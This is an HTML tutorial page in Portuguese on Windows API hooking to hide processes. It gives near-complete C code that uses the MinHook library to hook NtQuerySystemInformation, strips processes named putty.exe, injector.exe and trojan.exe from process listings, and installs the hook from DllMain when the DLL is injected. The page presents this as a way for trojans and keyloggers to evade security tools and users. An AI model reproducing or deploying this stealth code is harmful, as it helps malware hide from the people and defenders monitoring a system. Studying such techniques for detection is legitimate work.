
<!DOCTYPE html>
<html lang="en">
<head>
    <style>
        body{
            background-color: black;
        }
        a{
            text-decoration: node;
            color: red;
            text-decoration-line: none;
            text-decoration-color: none;
        }
        a:hover{
            text-decoration: node;
            color: red;
            text-decoration-line: none;
            text-decoration-color: none;
        }
        .code-container {
            background-color: black;
            border: 1px solid #ff0000;
            padding: 10px;
            overflow-x: auto;
            max-width: 600px;
            max-height: 400px; /* Defina a altura máxima desejada */
        }
        code {
            display: block;
            white-space: pre;
        }
    </style>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>API-Hooking</title>
</head>
<body>
<pre style="color: white">
[ By Vithor176 ]

  ,-.       _,---._ __  / \
 /  )    .-'       `./ /   \
(  (   ,'            `/    /|
 \  `-"             \'\   / |
  `.              ,  \ \ /  |
   /`.          ,'-`----Y   |
  (            ;        |   '
  |  ,-.    ,-' Digital |  /
  |  | (   |     h3ll   | /
  )  |  \  `.___________|/
  `--'   `--'
`-----------------------------'

<a style="color: red">  [ API Hooking para ocultar um processo ]</a>

<a style="color: blue">[1]</a> O Que é um API Hooking?

API Hooking é uma técnica para esconder um programa em um computador.
Ela funciona interceptando e alterando as instruções que o sistema usa para mostrar os programas em execução.
Dessa forma, o programa fica invisível para quem está tentando encontrá-lo.


<a style="color: blue">[2]</a> Exemplos Praticos:

O API Hooking também pode ser usado  para esconder processos suspeitos ou atividades indesejadas em um sistema operacional.
Ao interceptar chamadas de API relacionadas ao gerenciamento de processos, esses atores mal-intencionados podem:
Esconder Malware: Malware, como trojans e keyloggers, pode ser projetado para usar o API Hooking para evitar a detecção, tornando-se invisível para ferramentas de segurança e para o usuário.

<a style="color: blue">[3]</a> Codigo:

Função para a Inclusão da biblioteca libMinHook para gerenciamento de ganchos e hooks:

<div class="code-container" style="max-width: 900px; max-height: 1000px;">
<div class="code">
#pragma comment(lib, "libMinHook.x64.lib")

PNT_QUERY_SYSTEM_INFORMATION Original_NtQuerySystemInformation; // Ponteiro para a função NtQuerySystemInformation original
PNT_QUERY_SYSTEM_INFORMATION New_NtQuerySystemInformation;      // Novo ponteiro para a função NtQuerySystemInformation
wchar_t* process;
</div></div>

Função de gancho para NtQuerySystemInformation:

<div class="code-container" style="max-width: 900px; max-height: 1000px;">
<div class="code">
NTSTATUS WINAPI Hooked_NtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength)
{
</div></div>

Chama a função NtQuerySystemInformation original através do novo ponteiro:

<div class="code-container" style="max-width: 900px; max-height: 1000px;">
    <div class="code">
    NTSTATUS stat = New_NtQuerySystemInformation(
        SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength);
    </div></div>
	
Verifica se o SystemInformationClass é do tipo SystemProcessInformation e se a chamada foi bem-sucedida:

<div class="code-container" style="max-width: 900px; max-height: 1000px;">
    <div class="code">
    if (SystemProcessInformation == SystemInformationClass && stat == 0)
    {
        // Itera sobre a lista de processos e remove processos específicos
        P_SYSTEM_PROCESS_INFORMATION prev = P_SYSTEM_PROCESS_INFORMATION(SystemInformation);
        P_SYSTEM_PROCESS_INFORMATION curr = P_SYSTEM_PROCESS_INFORMATION((PUCHAR)prev + prev->NextEntryOffset);
        while (prev->NextEntryOffset != NULL) {
            // Verifica se o nome do processo corresponde a processos específicos e os remove da lista
            if (!lstrcmp(curr->ImageName.Buffer, L"putty.exe") || !lstrcmp(curr->ImageName.Buffer, L"injector.exe") || !lstrcmp(curr->ImageName.Buffer, L"trojan.exe")) {
                // Remove o processo da lista, mantendo a integridade da estrutura
                if (curr->NextEntryOffset == 0) {
                    prev->NextEntryOffset = 0;
                }
                else {
                    prev->NextEntryOffset += curr->NextEntryOffset;
                }
                curr = prev;
            }
            prev = curr;
            curr = P_SYSTEM_PROCESS_INFORMATION((PUCHAR)curr + curr->NextEntryOffset);
        }
    }

    return stat;
}

    </div></div>

Configuração do gancho para a função NtQuerySystemInformation:

<div class="code-container" style="max-width: 900px; max-height: 1000px;">
    <div class="code">
bool set_nt_hook()
{
    HMODULE ntdll = GetModuleHandle(L"ntdll.dll"); // Obtém o handle do módulo ntdll.dll, onde a função NtQuerySystemInformation está localizada
    
    Original_NtQuerySystemInformation = (PNT_QUERY_SYSTEM_INFORMATION)GetProcAddress(ntdll, "NtQuerySystemInformation");

    // Inicializa o gerenciador de ganchos
    if (MH_Initialize() != MH_OK) { return false; }

    // Cria o gancho para a função NtQuerySystemInformation
    if (MH_CreateHook(Original_NtQuerySystemInformation, &Hooked_NtQuerySystemInformation,
        (LPVOID*)&New_NtQuerySystemInformation) != MH_OK) {
        return false;
    }

    // Ativa o gancho
    if (MH_EnableHook(Original_NtQuerySystemInformation) != MH_OK) { return false; }

    return true;
}
    </div></div>

Função principal para DLL:

<div class="code-container" style="max-width: 900px; max-height: 1000px;">
<div class="code">
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        // Exibe uma caixa de mensagem informando que a DLL foi injetada com sucesso
        MessageBox(NULL, L"Vithor176", L"Injetado com sucesso!", MB_OK);
        
        // Configura o gancho na função NtQuerySystemInformation
        if (!set_nt_hook()) {
            return FALSE;
        }
        break;
    case DLL_PROCESS_DETACH:
        // Desativa e libera o gancho quando a DLL é descarregada
        MH_DisableHook(Original_NtQuerySystemInformation);
        MH_Uninitialize();
        break;
    }
    return TRUE;
}
</div></div>

<a style="color: blue">[4]</a> O que fizemos até agora:

O código em questão tem como principal objetivo interceptar e modificar o comportamento da função <a href='https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation' style='color: red;'>NtQuerySystemInformation</a>.
que é usada para obter informações sobre processos do sistema em sistemas Windows. Para fazer isso, o código utiliza a biblioteca <a href='https://www.codeproject.com/Articles/44326/MinHook-The-Minimalistic-x-x-API-Hooking-Libra' style='color: red;'>libMinHook</a> para criar e gerenciar ganchos (hooks) na função alvo.
primeiro o código inclui a biblioteca <a href='https://www.codeproject.com/Articles/44326/MinHook-The-Minimalistic-x-x-API-Hooking-Libra' style='color: red;'>libMinHook</a> e declara duas variáveis importantes: Original_NtQuerySystemInformation e New_NtQuerySystemInformation. O primeiro é um ponteiro para a função NtQuerySystemInformation original, enquanto o segundo será usado como o novo ponto de entrada.
a função Hooked_NtQuerySystemInformation é o ponto de entrada alternativo para NtQuerySystemInformation. Sempre que alguém tenta acessar NtQuerySystemInformation, essa função é chamada. Ela verifica se a consulta é para obter informações sobre processos do sistema (SystemProcessInformation). Se for o caso e a consulta for bem-sucedida, a função percorre a lista de processos e remove processos específicos, como "putty.exe", "injector.exe" ou "trojan.exe", antes de retornar os resultados.
a função set_nt_hook é responsável por configurar o gancho na função NtQuerySystemInformation. Ela começa obtendo o identificador do módulo ntdll.dll, onde a função alvo está localizada. Em seguida, inicializa o gerenciador de ganchos libMinHook, cria um gancho para a função original NtQuerySystemInformation e redireciona as chamadas para a função Hooked_NtQuerySystemInformation. Por fim, ativa o gancho para que ele comece a interceptar as chamadas para a função original.
a função <a href='https://learn.microsoft.com/en-us/windows/win32/dlls/dllmain' style='color: red;'>DllMain</a> é chamada quando a DLL é carregada ou descarregada. Quando a DLL é anexada a um processo (<a href='https://learn.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/cordllmain-function' style='color: red;'>DLL_PROCESS_ATTACH</a>), uma caixa de mensagem é exibida para indicar que a DLL foi injetada com sucesso. Quando a DLL é desanexada (<a href='https://learn.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/cordllmain-function' style='color: red;'>DLL_PROCESS_DETACH</a>), o gancho é desativado e o gerenciador de ganchos é desinicializado.
em resumo, o código permite a manipulação das informações retornadas pela função NtQuerySystemInformation para ocultar processos específicos da lista de processos do sistema em sistemas Windows.

<a style="color: blue">[5]</a> PoC

<center>
<video width="640" height="360" controls>
    <source src="Untitled.mp4" type="video/mp4">
    Desculpe, o seu navegador não suporta este vídeo.
</video>
</center>
<a style="color: blue">[6]</a> Referencias:

	https://tbhaxor.com/windows-process-listing-using-ntquerysysteminformation/
	https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation
	https://guidedhacking.com/threads/windows-api-hooking-how-to-hide-process-from-task-manager.12061/